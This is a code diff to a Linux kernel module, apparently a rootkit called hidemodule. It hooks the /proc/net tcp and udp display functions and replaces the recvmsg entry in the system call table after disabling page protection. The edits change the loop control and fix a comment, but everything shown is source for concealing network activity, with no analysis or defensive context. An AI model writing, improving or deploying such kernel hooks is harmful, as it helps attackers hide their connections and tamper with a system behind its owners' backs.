@@ -237,23 +237,22 @@ static int __init hidemodule_init(void)
 	struct proc_dir_entry *proc = init_net.proc_net->subdir;
     	struct tcp_seq_afinfo *tcp_seq = 0;
     	struct udp_seq_afinfo *udp_seq = 0;
-	int count = 0;
 	
-	while(proc && count<2)
+	while(proc)
 	{	
 		if(strcmp(proc->name, "tcp") == 0 && strcmp(tlp_version, "tcp") == 0)
 		{	
 			tcp_seq = proc->data;
 			original_tcp_show = tcp_seq->seq_ops.show;
 			tcp_seq->seq_ops.show = manipulated_tcp_show;
-			count++;
+			break;
 		}
 		if(strcmp(proc->name, "udp") == 0 && strcmp(tlp_version, "udp") == 0)
 		{
 			udp_seq = proc->data;
 			original_udp_show = udp_seq->seq_ops.show;
 			udp_seq->seq_ops.show = manipulated_udp_show;
-			count++;
+			break;
 		} 
 		proc = proc->next;
 	}
@@ -264,9 +263,9 @@ static int __init hidemodule_init(void)
         	disable_page_protection();
 
         	/*
-       		 * keep pointer to original function in original_socketcall, and
+       		 * keep pointer to original function in original_recvmsg, and
         	 * replace the system call in the system call table with
-       	 	 * manipulated_socketcall
+       	 	 * manipulated_recvmsg
          	 */
         	original_recvmsg = (void *)sys_call_table[__NR_recvmsg];
 		sys_call_table[__NR_recvmsg] =  (unsigned long*)manipulated_recvmsg;
@@ -292,21 +291,20 @@ static void __exit hidemodule_exit(void)
         struct proc_dir_entry *proc = init_net.proc_net->subdir;
 	struct tcp_seq_afinfo *tcp_seq = 0;
     	struct udp_seq_afinfo *udp_seq = 0;
-	int count = 0;
 	
-	while(proc && count<2)
+	while(proc )
 	{
 		if(strcmp(proc->name, "tcp") == 0 && strcmp(tlp_version, "tcp") == 0)
 		{
             		tcp_seq = proc->data;
 	                tcp_seq->seq_ops.show = original_tcp_show;
-            		count++;
+            		break;
         	}
 		if(strcmp(proc->name, "udp") == 0 && strcmp(tlp_version, "udp") == 0)
 		{
 			udp_seq = proc->data;
 			udp_seq->seq_ops.show = original_udp_show;
-			count++;
+			break;
 		}
 	
 		proc = proc->next;
@@ -327,4 +325,4 @@ static void __exit hidemodule_exit(void)
 
 module_init(hidemodule_init);
 module_exit(hidemodule_exit);
-
+	
